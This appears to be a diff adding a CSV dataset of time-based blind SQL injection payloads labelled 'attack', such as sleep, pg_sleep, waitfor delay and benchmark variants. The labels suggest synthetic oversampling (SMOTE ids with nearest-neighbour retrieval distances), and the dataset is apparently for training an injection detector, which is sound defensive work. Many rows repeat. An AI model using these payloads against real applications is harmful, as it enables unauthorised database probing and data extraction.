@@ -1,0 +1,201 @@
+id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
+SMOTE_000001,attack,time,select pg_sleep  (  5  )   and    (    (     (  9476  =  9476,nearest_attack_euclidean,R000202,1.0142655727198677
+SMOTE_000002,attack,time,"1   )    )    as hrks where 7637  =  7637 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000205,1.0940267287067098
+SMOTE_000003,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R000155,0.405516706919972
+SMOTE_000004,attack,time,"1%""   )    )     )   rlike sleep  (  5  )  #",nearest_attack_euclidean,R000234,0.7873341678848081
+SMOTE_000005,attack,time,"1'  )   as wnys where 6457  =  6457 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000129,0.0764848196748626
+SMOTE_000006,attack,time,select sleep  (  5  )   and    (    (   'ilcv'  =  'ilcv,nearest_attack_euclidean,R000094,0.24680764797947727
+SMOTE_000007,attack,time,1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000099,0.7568575155173153
+SMOTE_000008,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000199,1.1192583334031407
+SMOTE_000009,attack,time,1  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000246,2.2651612402013344
+SMOTE_000010,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,nearest_attack_euclidean,R000049,1.209110522498946
+SMOTE_000011,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000161,0.4760817090102375
+SMOTE_000012,attack,time,1 waitfor delay '0:0:5'# opyp,nearest_attack_euclidean,R000184,0.21458444008083283
+SMOTE_000013,attack,time,"1'||  (  select 'mzsy' where 4940  =  4940 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000149,0.6568171236428817
+SMOTE_000014,attack,time,select sleep  (  5   )    )   ||',nearest_attack_euclidean,R000089,0.39478943385018633
+SMOTE_000015,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000132,0.5693570401316748
+SMOTE_000016,attack,time,"waitfor delay '0:0:5' and    (    (   ""zili"" like ""zili",nearest_attack_euclidean,R000166,0.06723931012139375
+SMOTE_000017,attack,time,"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""grct""  =  ""grct",nearest_attack_euclidean,R000085,1.295949310430369
+SMOTE_000018,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000037,1.2911181163161276
+SMOTE_000019,attack,time,1   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   9288  =  9288,nearest_attack_euclidean,R000232,0.5331915132332463
+SMOTE_000020,attack,time,1 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000243,0.9624542219167116
+SMOTE_000021,attack,time,"select sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000188,0.24415261242728953
+SMOTE_000022,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000066,1.3141837199464397
+SMOTE_000023,attack,time,"1""  )   as ghpx where 2873  =  2873 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000248,0.489504229945312
+SMOTE_000024,attack,time,waitfor delay '0:0:5',nearest_attack_euclidean,R000308,0.986022110747541
+SMOTE_000025,attack,time,1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000264,0.19286393739723615
+SMOTE_000026,attack,time,"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000018,1.7045632411593383
+SMOTE_000027,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000240,1.5380102632806134
+SMOTE_000028,attack,time,"1' in boolean mode  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000237,1.5216231495564783
+SMOTE_000029,attack,time,1   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  5333  =  5333,nearest_attack_euclidean,R000298,2.091104297518096
+SMOTE_000030,attack,time,"1""  )   where 7588  =  7588 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000281,0.43809739047991336
+SMOTE_000031,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000072,0.6680690567350825
+SMOTE_000032,attack,time,1'||  (  select 'sbip' from dual where 7302  =  7302 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   ||',nearest_attack_euclidean,R000124,1.5511797654368196
+SMOTE_000033,attack,time,"1   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  6556  =  6556",nearest_attack_euclidean,R000159,0.07864383751432283
+SMOTE_000034,attack,time,1'  )   waitfor delay '0:0:5',nearest_attack_euclidean,R000171,1.8775714335946831
+SMOTE_000035,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000054,0.4570165668717674
+SMOTE_000036,attack,time,1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000078,0.257828151281881
+SMOTE_000037,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000029,0.7208597737673571
+SMOTE_000038,attack,time,"1',  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R000291,3.367235048161996
+SMOTE_000039,attack,time,"select sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000188,0.860784683378413
+SMOTE_000040,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  3124  =  3124,nearest_attack_euclidean,R000272,0.4021270592438102
+SMOTE_000041,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'zxik'  =  'zxik,nearest_attack_euclidean,R000213,1.3593788828617508
+SMOTE_000042,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R000155,0.48726435114423305
+SMOTE_000043,attack,time,"1""  )   as tnux where 4888  =  4888 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000087,0.6428232453560814
+SMOTE_000044,attack,time,1'   )    )    as cpwx where 5378  =  5378 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000113,0.4892257179976222
+SMOTE_000045,attack,time,"1' and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000244,1.3935455522140803
+SMOTE_000046,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xwsb'  =  'xwsb",nearest_attack_euclidean,R000036,0.6702614202855631
+SMOTE_000047,attack,time,"1   )    )    as hrks where 7637  =  7637 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000205,1.5634753811191786
+SMOTE_000048,attack,time,select pg_sleep  (  5   )    )   +',nearest_attack_euclidean,R000294,1.6333252262764066
+SMOTE_000049,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000199,0.7163978659269388
+SMOTE_000050,attack,time,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000035,0.8035939339224181
+SMOTE_000051,attack,time,1%'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000097,0.20454715651154962
+SMOTE_000052,attack,time,1'  )   where 2928  =  2928 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000222,1.300015742937099
+SMOTE_000053,attack,time,1'  )   as irck where 3660  =  3660 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R000296,0.010575140588527172
+SMOTE_000054,attack,time,"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""sdps""  =  ""sdps",nearest_attack_euclidean,R000105,0.06750917204202589
+SMOTE_000055,attack,time,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000238,0.1333183452845285
+SMOTE_000056,attack,time,"select sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000188,0.8596106781612699
+SMOTE_000057,attack,time,"1'||  (  select 'mzsy' where 4940  =  4940 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000149,0.26626791424218554
+SMOTE_000058,attack,time,"1'||  (  select 'kojx' from dual where 8140  =  8140 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000014,2.581874433157594
+SMOTE_000059,attack,time,"1   )    )    as dhge where 4816  =  4816 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000076,1.1125783847363822
+SMOTE_000060,attack,time,1' where 6035  =  6035 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000233,0.6882004691490761
+SMOTE_000061,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'egnv' like 'egnv",nearest_attack_euclidean,R000108,0.39980154512140365
+SMOTE_000062,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000043,0.055586170921989864
+SMOTE_000063,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000043,0.008139863608944625
+SMOTE_000064,attack,time,1   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000220,0.01883550180277581
+SMOTE_000065,attack,time,"1"" waitfor delay '0:0:5'",nearest_attack_euclidean,R000196,0.9501813999374459
+SMOTE_000066,attack,time,1  )   where 2468  =  2468 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000173,0.2206199401062871
+SMOTE_000067,attack,time,select pg_sleep  (  5  )   and    (    (     (  9476  =  9476,nearest_attack_euclidean,R000202,1.0327330370906247
+SMOTE_000068,attack,time,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000103,0.892230853183542
+SMOTE_000069,attack,time,waitfor delay '0:0:5',nearest_attack_euclidean,R000308,1.332221922824141
+SMOTE_000070,attack,time,1'+  (  select iowv where 6105  =  6105 and sleep  (  5  )  #,nearest_attack_euclidean,R000143,1.8223135340082623
+SMOTE_000071,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,nearest_attack_euclidean,R000049,1.1908710089587926
+SMOTE_000072,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000172,0.3560629778347529
+SMOTE_000073,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,nearest_attack_euclidean,R000057,1.1364505872737551
+SMOTE_000074,attack,time,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag",nearest_attack_euclidean,R000026,1.1272437800422554
+SMOTE_000075,attack,time,select pg_sleep  (  5  )   and 'rpka'  =  'rpka,nearest_attack_euclidean,R000063,1.091624578105056
+SMOTE_000076,attack,time,begin dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000033,3.8481483750157315
+SMOTE_000077,attack,time,"1'   )    )    as agdn where 8442  =  8442 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000185,0.21184616465029454
+SMOTE_000078,attack,time,"1   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  8671  =  8671",nearest_attack_euclidean,R000071,0.22371265838220586
+SMOTE_000079,attack,time,"1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000167,0.4331666042428606
+SMOTE_000080,attack,time,"1'+  (  select 'wkcq' where 1020  =  1020 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000223,0.9974383666563886
+SMOTE_000081,attack,time,"1'  )   where 4778  =  4778 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000231,0.38691140262774315
+SMOTE_000082,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""gixv""  =  ""gixv",nearest_attack_euclidean,R000178,0.10454131545601313
+SMOTE_000083,attack,time,"1"" waitfor delay '0:0:5'",nearest_attack_euclidean,R000196,0.9567692648750931
+SMOTE_000084,attack,time,"1""   )    )     )   and sleep  (  5  )  #",nearest_attack_euclidean,R000247,0.6307614282799638
+SMOTE_000085,attack,time,1'  )   where 4364  =  4364 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000127,1.172706695598306
+SMOTE_000086,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'uzmy' like 'uzmy,nearest_attack_euclidean,R000266,0.9459512745335905
+SMOTE_000087,attack,time,1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,nearest_attack_euclidean,R000148,1.1568062479236059
+SMOTE_000088,attack,time,"1""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000083,1.7452657845377602
+SMOTE_000089,attack,time,select sleep  (  5  )   and    (    (   'ilcv'  =  'ilcv,nearest_attack_euclidean,R000094,0.38628963443728154
+SMOTE_000090,attack,time,"1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000267,0.7165055092897056
+SMOTE_000091,attack,time,"select sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000039,1.2355354373522125
+SMOTE_000092,attack,time,1' rlike sleep  (  5  )   and 'ojqz' like 'ojqz,nearest_attack_euclidean,R000310,0.4613400694158189
+SMOTE_000093,attack,time,"1   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   8280  =  8280",nearest_attack_euclidean,R000139,0.571151310987275
+SMOTE_000094,attack,time,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000238,0.8742813089971074
+SMOTE_000095,attack,time,1  )   where 2734  =  2734 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000051,0.20621070915891207
+SMOTE_000096,attack,time,"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",nearest_attack_euclidean,R000123,0.13039683603574892
+SMOTE_000097,attack,time,1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000099,0.977590946238654
+SMOTE_000098,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000005,1.9318828533307588
+SMOTE_000099,attack,time,1'+  (  select 'jtvq' where 8288  =  8288 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000050,2.516386476159289
+SMOTE_000100,attack,time,waitfor delay '0:0:5'--,nearest_attack_euclidean,R000068,0.9506583115535958
+SMOTE_000101,attack,time,"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'mbxh' like 'mbxh",nearest_attack_euclidean,R000253,1.9105904263152393
+SMOTE_000102,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000168,0.8077769333383417
+SMOTE_000103,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000002,2.47227109315941
+SMOTE_000104,attack,time,"1""   )    )    and sleep  (  5  )   and    (    (   ""lied"" like ""lied",nearest_attack_euclidean,R000197,0.33913159028004514
+SMOTE_000105,attack,time,1'  )   rlike sleep  (  5  )   and   (  'qsub' like 'qsub,nearest_attack_euclidean,R000201,0.7838920567190819
+SMOTE_000106,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000269,1.2204689585042765
+SMOTE_000107,attack,time,"1   )    )    as dhge where 4816  =  4816 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000076,0.6926562979201366
+SMOTE_000108,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000132,0.9964109900731247
+SMOTE_000109,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000157,2.1795107304468617
+SMOTE_000110,attack,time,"1""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000091,0.5249555234250852
+SMOTE_000111,attack,time,"1'  )   where 6248  =  6248 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000285,0.06782584242640063
+SMOTE_000112,attack,time,"1"" waitfor delay '0:0:5'",nearest_attack_euclidean,R000196,0.7021592324874654
+SMOTE_000113,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000240,2.0102319546742944
+SMOTE_000114,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,nearest_attack_euclidean,R000254,0.2456826179173635
+SMOTE_000115,attack,time,"1'   )    )    as fusi where 2788  =  2788 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000239,0.9754525427492401
+SMOTE_000116,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000009,1.370375049739598
+SMOTE_000117,attack,time,select sleep  (  5  )   and    (    (     (  'klma'  =  'klma,nearest_attack_euclidean,R000224,0.02250278875282645
+SMOTE_000118,attack,time,"select sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000188,0.4652333842016529
+SMOTE_000119,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,nearest_attack_euclidean,R000254,1.1846756694500191
+SMOTE_000120,attack,time,1'  )   where 5540  =  5540 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000258,0.21562965928054006
+SMOTE_000121,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000012,1.2593656419854447
+SMOTE_000122,attack,time,1  )   where 4600  =  4600 or sleep  (  5  )  --,nearest_attack_euclidean,R000141,0.01812497804667008
+SMOTE_000123,attack,time,1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000136,0.9148515063833957
+SMOTE_000124,attack,time,"1'  )   as wnys where 6457  =  6457 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000129,0.8210181853071044
+SMOTE_000125,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000054,0.04911667835390487
+SMOTE_000126,attack,time,"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000028,0.5887527239488007
+SMOTE_000127,attack,time,1%'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000097,0.4604876561306754
+SMOTE_000128,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000006,0.032229996734150945
+SMOTE_000129,attack,time,"1""  )   where 5938  =  5938 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000304,0.7541581304245574
+SMOTE_000130,attack,time,select pg_sleep  (  5   )    )   +',nearest_attack_euclidean,R000294,1.8153739914307496
+SMOTE_000131,attack,time,"select sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000039,1.1192348014639764
+SMOTE_000132,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000072,1.5061454418209235
+SMOTE_000133,attack,time,1  )   where 2468  =  2468 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000173,0.3689600915977833
+SMOTE_000134,attack,time,1   )    )    as hxtp where 5478  =  5478 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000207,1.1098510701121063
+SMOTE_000135,attack,time,1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'ckmm' like 'ckmm,nearest_attack_euclidean,R000065,0.09839414814964248
+SMOTE_000136,attack,time,"1  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000297,0.40162510201842955
+SMOTE_000137,attack,time,"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000081,1.15140511876873
+SMOTE_000138,attack,time,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000229,0.5502257452334849
+SMOTE_000139,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000164,0.16792672529798583
+SMOTE_000140,attack,time,1  )   where 2468  =  2468 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000173,0.1316263984383196
+SMOTE_000141,attack,time,"1%""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000230,0.6575368500744408
+SMOTE_000142,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,nearest_attack_euclidean,R000146,1.2551280856282738
+SMOTE_000143,attack,time,"1%""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000074,0.6763113086777782
+SMOTE_000144,attack,time,select sleep  (  5  )  --,nearest_attack_euclidean,R000177,0.0003414295985425712
+SMOTE_000145,attack,time,"1' in boolean mode  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000237,0.24598214736599266
+SMOTE_000146,attack,time,"1  )   where 3062  =  3062 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000295,0.1430939392669783
+SMOTE_000147,attack,time,select sleep  (  5  )   and    (    (     (  'thqr' like 'thqr,nearest_attack_euclidean,R000270,0.2048382976842252
+SMOTE_000148,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000037,1.122308934969555
+SMOTE_000149,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin",nearest_attack_euclidean,R000102,1.4730461226273421
+SMOTE_000150,attack,time,"1%""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000230,0.8997883307170692
+SMOTE_000151,attack,time,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000103,0.07917493970100475
+SMOTE_000152,attack,time,"1%""   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000137,0.13744558188019082
+SMOTE_000153,attack,time,1%'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000210,0.6778048868448443
+SMOTE_000154,attack,time,select sleep  (  5  )  #,nearest_attack_euclidean,R000069,1.7385545367774078
+SMOTE_000155,attack,time,"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""mynm"" like ""mynm",nearest_attack_euclidean,R000257,0.9731616402251574
+SMOTE_000156,attack,time,"1""  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000212,0.2673901587711731
+SMOTE_000157,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000019,0.49572319818831195
+SMOTE_000158,attack,time,1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000136,0.502602761508096
+SMOTE_000159,attack,time,"1   )    )    as hrks where 7637  =  7637 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000205,0.8419587749017708
+SMOTE_000160,attack,time,select sleep  (  5  )  --,nearest_attack_euclidean,R000177,0.12590444386041236
+SMOTE_000161,attack,time,1'||  (  select 'bwqc' from dual where 6897  =  6897 and sleep  (  5  )  #,nearest_attack_euclidean,R000125,1.5105652386961
+SMOTE_000162,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'dvpw'  =  'dvpw",nearest_attack_euclidean,R000200,0.556550226741871
+SMOTE_000163,attack,time,1  )   where 2468  =  2468 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000173,0.10722040746846806
+SMOTE_000164,attack,time,"1'+  (  select 'dbvq' where 2045  =  2045 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000311,0.40932016105989494
+SMOTE_000165,attack,time,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000035,0.68684582225716
+SMOTE_000166,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000054,1.1856548903064223
+SMOTE_000167,attack,time,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000103,0.21573715255205822
+SMOTE_000168,attack,time,"1""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""zlwb""  =  ""zlwb",nearest_attack_euclidean,R000302,0.31120582662559626
+SMOTE_000169,attack,time,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'wevl'  =  'wevl,nearest_attack_euclidean,R000024,0.07754891035766641
+SMOTE_000170,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,nearest_attack_euclidean,R000146,1.1289196019948435
+SMOTE_000171,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000132,0.8957103708340132
+SMOTE_000172,attack,time,"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""sdps""  =  ""sdps",nearest_attack_euclidean,R000105,1.1101825746369722
+SMOTE_000173,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000215,0.5756572715375342
+SMOTE_000174,attack,time,1 where 7299  =  7299 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000142,0.009686155546039882
+SMOTE_000175,attack,time,1  )   where 2468  =  2468 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000173,0.7186803660076624
+SMOTE_000176,attack,time,"1,  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R000077,7.922209712088862
+SMOTE_000177,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000161,0.23503942397835909
+SMOTE_000178,attack,time,1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000044,0.605372497942789
+SMOTE_000179,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000240,0.9772806793380313
+SMOTE_000180,attack,time,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,nearest_attack_euclidean,R000293,0.048892336914644154
+SMOTE_000181,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R000126,0.0850857515158017
+SMOTE_000182,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000269,0.503821237557425
